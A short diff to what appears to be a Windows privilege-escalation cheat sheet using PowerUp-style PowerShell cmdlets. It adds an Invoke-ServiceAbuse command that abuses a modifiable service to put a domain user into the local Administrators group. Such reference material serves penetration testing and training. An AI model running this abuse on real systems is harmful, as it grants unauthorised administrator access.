@@ -83,6 +83,10 @@ PS> Get-ModifiableServiceFile -Verbose
 
 PS> Get-ModifiableService -Verbose
 
+<b>::: ABUSE FUNCTION FOR "Get-ModifiableService" & ADD OUR CURRENT DOMAIN USER TO THE LOCAL ADMINISTRATORS GROUP</b> 
+
+PS> Invoke-ServiceAbuse -Name 'service_name' -UserName 'domain\user'
+
 <b>::: RUN ALL CHECKS</b>
 
 PS> Invoke-AllChecks
